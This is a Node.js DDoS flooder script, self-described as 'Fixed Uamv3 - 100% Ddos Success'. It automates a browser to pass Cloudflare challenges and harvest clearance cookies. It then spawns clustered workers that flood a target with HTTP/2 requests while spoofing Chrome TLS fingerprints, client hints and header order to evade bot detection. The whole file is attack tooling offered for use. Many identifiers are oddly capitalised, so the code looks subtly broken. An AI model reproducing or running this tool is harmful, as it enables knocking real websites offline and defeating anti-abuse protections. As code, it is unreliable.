const { Connect } = require("puppeteer-real-browser");
const Http2 = require("http2");
const Tls = require("tls");
const Cluster = require("cluster");
const Url = require("url");
const Crypto = require("crypto");
const Fs = require("fs");
const Os = require("os");
const Hpack = require('hpack');

function GetAdvancedChromeTlsOptions(parsedTarget) {
    const ChromeProfiles = [
        {
            Version: 131,
            Ciphers: [
                'TLS_AES_128_GCM_SHA256', 'TLS_AES_256_GCM_SHA384', 'TLS_CHACHA20_POLY1305_SHA256',
                'ECDHE-ECDSA-AES128-GCM-SHA256', 'ECDHE-RSA-AES128-GCM-SHA256', 'ECDHE-ECDSA-AES256-GCM-SHA384',
                'ECDHE-RSA-AES256-GCM-SHA384', 'ECDHE-ECDSA-CHACHA20-POLY1305', 'ECDHE-RSA-CHACHA20-POLY1305',
                'ECDHE-RSA-AES128-SHA', 'ECDHE-RSA-AES256-SHA', 'AES128-GCM-SHA256', 'AES256-GCM-SHA384',
                'AES128-SHA', 'AES256-SHA'
            ]
        },
        {
            Version: 130,
            Ciphers: [
                'TLS_AES_128_GCM_SHA256', 'TLS_AES_256_GCM_SHA384', 'TLS_CHACHA20_POLY1305_SHA256',
                'ECDHE-ECDSA-AES128-GCM-SHA256', 'ECDHE-RSA-AES128-GCM-SHA256', 'ECDHE-ECDSA-AES256-GCM-SHA384',
                'ECDHE-RSA-AES256-GCM-SHA384', 'ECDHE-ECDSA-CHACHA20-POLY1305', 'ECDHE-RSA-CHACHA20-POLY1305',
                'AES128-GCM-SHA256', 'AES256-GCM-SHA384'
            ]
        },
        {
            Version: 129,
            Ciphers: [
                'TLS_AES_128_GCM_SHA256', 'TLS_AES_256_GCM_SHA384', 'TLS_CHACHA20_POLY1305_SHA256',
                'ECDHE-ECDSA-AES128-GCM-SHA256', 'ECDHE-RSA-AES128-GCM-SHA256', 'ECDHE-ECDSA-AES256-GCM-SHA384',
                'ECDHE-RSA-AES256-GCM-SHA384', 'ECDHE-ECDSA-CHACHA20-POLY1305', 'ECDHE-RSA-CHACHA20-POLY1305',
                'AES128-GCM-SHA256', 'AES256-GCM-SHA384', 'AES128-SHA', 'AES256-SHA'
            ]
        }
    ];

    const Profile = ChromeProfiles[Math.floor(Math.random() * ChromeProfiles.length)];
    const SupportedGroups = ['x25519', 'secp256r1', 'secp384r1'];
    const SigAlgs = [
        'ecdsa_secp256r1_sha256', 'rsa_pss_rsae_sha256', 'rsa_pkcs1_sha256', 'ecdsa_secp384r1_sha384',
        'rsa_pss_rsae_sha384', 'rsa_pkcs1_sha384', 'rsa_pss_rsae_sha512', 'rsa_pkcs1_sha512'
    ];
    
    const ShuffledCiphers = [...Profile.Ciphers];
    if (Math.random() < 0.05) {
        const I = ShuffledCiphers.length - 1, J = Math.max(0, I - 1);
        [ShuffledCiphers[I], ShuffledCiphers[J]] = [ShuffledCiphers[J], ShuffledCiphers[I]];
    }

    return {
        Ciphers: ShuffledCiphers.join(':'),
        Sigalgs: SigAlgs.join(':'),
        Groups: SupportedGroups.join(':'),
        MinVersion: 'TLSv1.2',
        MaxVersion: 'TLSv1.3',
        SecureOptions: Crypto.constants.SSL_OP_NO_RENEGOTIATION | Crypto.constants.SSL_OP_NO_TICKET |
                       Crypto.constants.SSL_OP_NO_SSLv2 | Crypto.constants.SSL_OP_NO_SSLv3 |
                       Crypto.constants.SSL_OP_NO_COMPRESSION,
        RejectUnauthorized: false,
        Servername: parsedTarget.Host
    };
}

function GenerateAdvancedBrowserHeaders(userAgentFromBypass) {
    const ChromeVersion = parseInt((userAgentFromBypass.match(/Chrome\/(\d+)/) || [])[1] || '131');
    const FullVersion = `${ChromeVersion}.0.${Math.floor(Math.random() * 5000)}.${Math.floor(Math.random() * 100)}`;

    const BrandTemplates = [
        `"Google Chrome";v="${ChromeVersion}", "Chromium";v="${ChromeVersion}", "Not-A.Brand";v="99"`,
        `"Chromium";v="${ChromeVersion}", "Google Chrome";v="${ChromeVersion}", "Not;A=Brand";v="8"`,
        `"Not)A;Brand";v="99", "Google Chrome";v="${ChromeVersion}", "Chromium";v="${ChromeVersion}"`
    ];
    const BrandValue = BrandTemplates[Math.floor(Math.random() * BrandTemplates.length)];

    const Platforms = ['"Windows"', '"macOS"', '"Linux"', '"Android"'];
    const Platform = Platforms[Math.floor(Math.random() * Platforms.length)];

    const Archs = ['"x86"', '"arm"', '"x64"', '""'];
    const Arch = Archs[Math.floor(Math.random() * Archs.length)];

    const Models = ['""', '"Intel Mac OS X 10_15_7"', '"Windows NT 10.0; Win64; x64"', '"SM-G960F"'];
    const Model = Models[Math.floor(Math.random() * Models.length)];

    const Bitness = ['"64"', '"32"', '""'][Math.floor(Math.random() * 3)];

    const ColorSchemes = ['light', 'dark', 'no-preference'];
    const ColorScheme = ColorSchemes[Math.floor(Math.random() * ColorSchemes.length)];

    const Languages = [
        "en-US,en;q=0.9,vi;q=0.8",
        "en-GB,en;q=0.9",
        "fr-FR,fr;q=0.9,en;q=0.8",
        "de-DE,de;q=0.9,en;q=0.8",
        "es-ES,es;q=0.9,en;q=0.8"
    ];
    const AcceptLanguage = Languages[Math.floor(Math.random() * Languages.length)];

    return {
        "Sec-Ch-Ua": BrandValue,
        "Sec-Ch-Ua-Mobile": Platform === '"Android"' ? "?1" : "?0",
        "Sec-Ch-Ua-Platform": Platform,
        "Sec-Ch-Ua-Arch": Arch,
        "Sec-Ch-Ua-Model": Model,
        "Sec-Ch-Ua-Platform-Version": `"${Math.floor(Math.random() * 15) + 10}.0.0"`,
        "Sec-Ch-Ua-Full-Version-List": `"Not)A;Brand";v="${FullVersion}", "Chromium";v="${FullVersion}", "Google Chrome";v="${FullVersion}"`,
        "Sec-Ch-Ua-Bitness": Bitness,
        "Sec-Ch-Prefers-Color-Scheme": ColorScheme,
        "Upgrade-Insecure-Requests": "1",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "Sec-Fetch-Site": "none",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-User": "?1",
        "Sec-Fetch-Dest": "document",
        "Accept-Encoding": "gzip, deflate, br, zstd",
        "Accept-Language": AcceptLanguage,
        "Origin": `https://${parsedTarget.Host}`,
        "Referer": Math.random() < 0.5 ? `https://${parsedTarget.Host}/` : ""
    };
}

function GetBrowserLikeHeaderOrder() {
    const BaseOrder = [
        ':Method',
        ':Authority',
        ':Scheme',
        ':Path',
        'User-Agent',
        'Sec-Ch-Ua',
        'Sec-Ch-Ua-Mobile',
        'Sec-Ch-Ua-Platform',
        'Sec-Ch-Ua-Arch',
        'Sec-Ch-Ua-Model',
        'Sec-Ch-Ua-Platform-Version',
        'Sec-Ch-Ua-Full-Version-List',
        'Sec-Ch-Ua-Bitness',
        'Sec-Ch-Prefers-Color-Scheme',
        'Upgrade-Insecure-Requests',
        'Accept',
        'Sec-Fetch-Site',
        'Sec-Fetch-Mode',
        'Sec-Fetch-User',
        'Sec-Fetch-Dest',
        'Accept-Encoding',
        'Accept-Language',
        'Origin',
        'Referer',
        'Cookie'
    ];
    const SecChStart = BaseOrder.indexOf('Sec-Ch-Ua');
    const SecChEnd = BaseOrder.indexOf('Upgrade-Insecure-Requests');
    const SecChSection = BaseOrder.slice(SecChStart, SecChEnd);
    if (Math.random() < 0.2) {
        for (let I = SecChSection.length - 1; I > 0; I--) {
            const J = Math.floor(Math.random() * (I + 1));
            [SecChSection[I], SecChSection[J]] = [SecChSection[J], SecChSection[I]];
        }
    }
    return [...BaseOrder.slice(0, SecChStart), ...SecChSection, ...BaseOrder.slice(SecChEnd)];
}

function BuildHeadersInOrder(headersObj, order) {
    const OrderedHeaders = {};
    order.forEach(Key => {
        if (headersObj.hasOwnProperty(Key)) {
            OrderedHeaders[Key] = headersObj[Key];
        }
    });
    Object.keys(headersObj).forEach(Key => {
        if (!order.includes(Key)) {
            OrderedHeaders[Key] = headersObj[Key];
        }
    });
    return OrderedHeaders;
}

function Randstr(length) {
    const Chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    let Result = "";
    for (let I = 0; I < length; I++) {
        Result += Chars[Math.floor(Math.random() * Chars.length)];
    }
    return Result;
}

function GenerateCacheBuster() {
    const Params = ['_', 'cb', 't', 'cache', 'v'];
    const Param = Params[Math.floor(Math.random() * Params.length)];
    const Value = Date.now() + Math.floor(Math.random() * 10000);
    return `${Param}=${Value}`;
}

async function BypassCloudflareOnce(attemptNum = 1) {
    let Response = null;
    let Browser = null;
    let Page = null;
    try {
        console.log(`\x1b[32m[+] Starting Bypass Attempt ${attemptNum}...\x1b[0m`);
        Response = await Connect({
            Headless: 'auto',
            Args: ['--no-sandbox', '--disable-setuid-sandbox', '--disable-gpu', '--window-size=1920,1080'],
            Turnstile: true,
        });
        Browser = Response.Browser;
        Page = Response.Page;
        await Page.goto(Args.Target, { WaitUntil: 'domcontentloaded', Timeout: 45000 });
        console.log("\x1b[32m[+] Checking For Cloudflare Challenge...\x1b[0m");
        
        let ChallengeCompleted = false;
        let WaitCount = 0;
        while (!ChallengeCompleted) {
            await new Promise(R => setTimeout(R, 500));
            WaitCount++;
            const Cookies = await Page.cookies();
            if (Cookies.some(C => C.Name === "cf_clearance")) {
                ChallengeCompleted = true;
                console.log(`\x1b[32m[+] Cf_clearance Cookie Found After ${WaitCount * 0.5} Seconds.\x1b[0m`);
                break;
            }
            if (WaitCount % 20 === 0) {
                console.log(`\x1b[32m[+] Still Waiting For Cf_clearance Cookie... (${WaitCount * 0.5} Seconds Elapsed)\x1b[0m`);
            }
        }

        const Cookies = await Page.cookies();
        const UserAgent = await Page.evaluate(() => navigator.UserAgent);
        await Browser.close();
        
        if (!Cookies.some(C => C.Name === "cf_clearance")) {
             throw new Error("Cf_clearance Cookie Not Found After Wait.");
        }

        console.log(`\x1b[32m[+] Bypass Attempt ${attemptNum} Successful.\x1b[0m`);
        return { Cookies, UserAgent, Success: true, AttemptNum: attemptNum };
    } catch (error) {
        console.log(`\x1b[32m[+] Bypass Attempt ${attemptNum} Failed: ${error.message}\x1b[0m`);
        try { if (Browser) await Browser.close(); } catch (e) {}
        return { Cookies: [], UserAgent: "", Success: false, AttemptNum: attemptNum };
    }
}

async function BypassCloudflareParallel(totalCount) {
    console.log("\x1b[32m[+] Cloudflare Bypass - Parallel Mode\x1b[0m");
    
    const Results = [];
    let AttemptCount = 0;
    const BatchSize = 3;
    
    while (Results.length < totalCount) {
        const Remaining = totalCount - Results.length;
        const CurrentBatchSize = Math.min(BatchSize, Remaining);
        console.log(`\x1b[32m[+] Starting Parallel Batch (${CurrentBatchSize} Sessions)...\x1b[0m`);
        
        const BatchPromises = Array.from({ Length: CurrentBatchSize }, () => BypassCloudflareOnce(++AttemptCount));
        const BatchResults = await Promise.all(BatchPromises);
        
        for (const Result of BatchResults) {
            if (Result.Success && Result.Cookies.length > 0) {
                Results.push(Result);
                console.log(`\x1b[32m[+] Session ${Result.AttemptNum} Obtained! (Total: ${Results.length}/${totalCount})\x1b[0m`);
            } else {
                console.log(`\x1b[32m[+] Session ${Result.AttemptNum} Failed\x1b[0m`);
            }
        }
        if (Results.length < totalCount) await new Promise(R => setTimeout(R, 2000));
    }
    return Results.length > 0 ? Results : [{ Cookies: [], UserAgent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36" }];
}

async function RunFlooder() {
    const BypassInfo = Global.BypassData[Math.floor(Math.random() * Global.BypassData.length)];
    if (!BypassInfo || !BypassInfo.UserAgent) return;

    const CookieString = BypassInfo.Cookies.map(C => `${C.Name}=${C.Value}`).join("; ");
    const AdvancedHeaders = GenerateAdvancedBrowserHeaders(BypassInfo.UserAgent);
    const TlsOptions = GetAdvancedChromeTlsOptions(ParsedTarget);

    const Client = Http2.connect(Args.Target, {
        CreateConnection: (authority, option) => {
            return Tls.connect({
                ...TlsOptions,
                Port: 443,
                Host: ParsedTarget.Host,
                AlpnProtocols: ['h2'],
            });
        },
        Settings: {
            HeaderTableSize: 262144,
            MaxConcurrentStreams: 100,
            InitialWindowSize: 6291456,
            MaxHeaderListSize: 4096
        }
    });

    const ConnectionId = Math.random().toString(36).substring(2);
    Global.ActiveConnections.add(ConnectionId);

    Client.on('connect', async () => {
        const AttackInterval = setInterval(async () => {
            if (Client.destroyed) {
                clearInterval(AttackInterval);
                return;
            }
            try {
                for (let I = 0; I < Args.Rate; I++) {
                    await new Promise(R => setTimeout(R, 50 + Math.floor(Math.random() * 150)));

                    const QuerySeparator = ParsedTarget.Path.includes('?') ? '&' : '?';
                    const PathWithBuster = ParsedTarget.Path + QuerySeparator + GenerateCacheBuster();

                    let Headers = {
                        ":Method": "GET",
                        ":Authority": ParsedTarget.Host,
                        ":Scheme": "https",
                        ":Path": PathWithBuster,
                        "User-Agent": BypassInfo.UserAgent,
                        "Cookie": CookieString,
                        ...AdvancedHeaders
                    };

                    const HeaderOrder = GetBrowserLikeHeaderOrder();
                    Headers = BuildHeadersInOrder(Headers, HeaderOrder);

                    const Req = Client.request(Headers);

                    Req.on('response', (resHeaders) => {
                        const Status = resHeaders[':Status'];
                        if (!Global.Statuses[Status]) Global.Statuses[Status] = 0;
                        Global.Statuses[Status]++;
                        Global.TotalRequests = (Global.TotalRequests || 0) + 1;
                        Req.close();
                    });

                    Req.on('error', () => {
                        if (!Global.Statuses["ERROR"]) Global.Statuses["ERROR"] = 0;
                        Global.Statuses["ERROR"]++;
                        Global.TotalRequests = (Global.TotalRequests || 0) + 1;
                        Req.close();
                    });

                    Req.end();
                }
            } catch (e) {}
        }, 1000);

        setTimeout(() => {
            clearInterval(AttackInterval);
            Client.close();
        }, 30000);
    });

    const Cleanup = () => {
        Global.ActiveConnections.delete(ConnectionId);
        Client.destroy();
    };
    Client.on('error', Cleanup);
    Client.on('close', Cleanup);
}

function DisplayStats() {
    const Elapsed = Math.floor((Date.now() - Global.StartTime) / 1000);
    const Remaining = Math.max(0, Args.Time - Elapsed);
    
    console.clear();
    console.log("\x1b[32m[+] Fixed Uamv3 - 100% Ddos Success\x1b[0m");
    console.log(`\x1b[32m[+] Target: ${Args.Target}\x1b[0m`);
    console.log(`\x1b[32m[+] Time: ${Elapsed}s / ${Args.Time}s\x1b[0m`);
    console.log(`\x1b[32m[+] Remaining: ${Remaining}s\x1b[0m`);
    console.log(`\x1b[32m[+] Config: Rate: ${Args.Rate}/s | Threads: ${Args.Threads}\x1b[0m`);
    console.log(`\x1b[32m[+] Sessions: ${Global.BypassData ? Global.BypassData.length : 0} / ${Args.CookieCount} Requested\x1b[0m`);

    let TotalStatuses = {};
    let TotalRequests = 0;
    for (let W in Global.Workers) {
        if (Global.Workers[W][0].State == 'online') {
            const Msg = Global.Workers[W][1];
            for (let St of Msg.StatusesQ) {
                for (let Code in St) {
                    if (!TotalStatuses[Code]) TotalStatuses[Code] = 0;
                    TotalStatuses[Code] += St[Code];
                }
            }
            TotalRequests += Msg.TotalRequests || 0;
        }
    }
    console.log(`\x1b[32m[+] Statistics:\x1b[0m`);
    console.log(`\x1b[32m[+] Total Requests: ${TotalRequests}\x1b[0m`);
    console.log(`\x1b[32m[+] Rate: ${Elapsed > 0 ? (TotalRequests / Elapsed).toFixed(2) : 0} Req/s\x1b[0m`);
    console.log(`\x1b[32m[+] Status Codes: ${JSON.stringify(TotalStatuses)}\x1b[0m`);

    const Progress = Math.floor((Elapsed / Args.Time) * 30);
    const ProgressBar = "█".repeat(Progress) + "░".repeat(30 - Progress);
    console.log(`\x1b[32m[+] Progress: [${ProgressBar}]\x1b[0m`);
}

Global.ActiveConnections = new Set();
Global.Workers = {};
Global.StartTime = Date.now();
Global.BypassData = [];

if (process.argv.length < 7) {
    console.log("\x1b[32m[+] Usage: Node Fixed.js <Target> <Time> <Rate> <Threads> <Cookiecount>\x1b[0m");
    console.log("\x1b[32m[+] Example: Node Fixed.js Https://example.com 60 100 8 5\x1b[0m");
    process.exit(1);
}

const Args = {
    Target: process.argv[2],
    Time: parseInt(process.argv[3]),
    Rate: parseInt(process.argv[4]),
    Threads: parseInt(process.argv[5]),
    CookieCount: parseInt(process.argv[6]) || 4
};

const ParsedTarget = Url.parse(Args.Target);

if (Cluster.isMaster) {
    console.clear();
    console.log("\x1b[32m[+] Fixed Uamv3 - 100% Ddos Success\x1b[0m");
    
    (async () => {
        const BypassResults = await BypassCloudflareParallel(Args.CookieCount);
        Global.BypassData = BypassResults;
        
        console.log(`\x1b[32m[+] Successfully Obtained ${BypassResults.length} Session(s)!\x1b[0m`);
        console.log("\x1b[32m[+] Starting Attack...\x1b[0m");
        
        Global.StartTime = Date.now();
        
        for (let I = 0; I < Args.Threads; I++) {
            const Worker = Cluster.fork();
            Worker.send({ Type: 'BypassData', Data: BypassResults });
        }
        
        const StatsInterval = setInterval(DisplayStats, 1000);
        
        Cluster.on('message', (worker, message) => {
            if (message.Type === 'Stats') {
                Global.Workers[worker.id] = [worker, message];
            }
        });
        
        Cluster.on('exit', (worker) => {
             if (Date.now() - Global.StartTime < Args.Time * 1000) {
                 const NewWorker = Cluster.fork();
                 NewWorker.send({ Type: 'BypassData', Data: Global.BypassData });
             }
        });
        
        setTimeout(() => {
            clearInterval(StatsInterval);
            console.log("\x1b[32m[+] Attack Completed!\x1b[0m");
            process.exit(0);
        }, Args.Time * 1000);
    })();
    
} else {
    let StatusesQ = [];
    Global.TotalRequests = 0;
    Global.Statuses = {};
    
    process.on('message', (msg) => {
        if (msg.Type === 'BypassData') {
            Global.BypassData = msg.Data;
            setInterval(() => RunFlooder(), 500);
            
            setInterval(() => {
                if (Object.keys(Global.Statuses).length > 0) {
                    if (StatusesQ.length >= 4) StatusesQ.shift();
                    StatusesQ.push({...Global.Statuses});
                    Global.Statuses = {};
                }
                process.send({
                    Type: 'Stats',
                    StatusesQ: StatusesQ,
                    TotalRequests: Global.TotalRequests
                });
            }, 250);
        }
    });
    
    setTimeout(() => process.exit(0), Args.Time * 1000);
}

process.on('uncaughtException', () => {});
process.on('unhandledRejection', () => {});
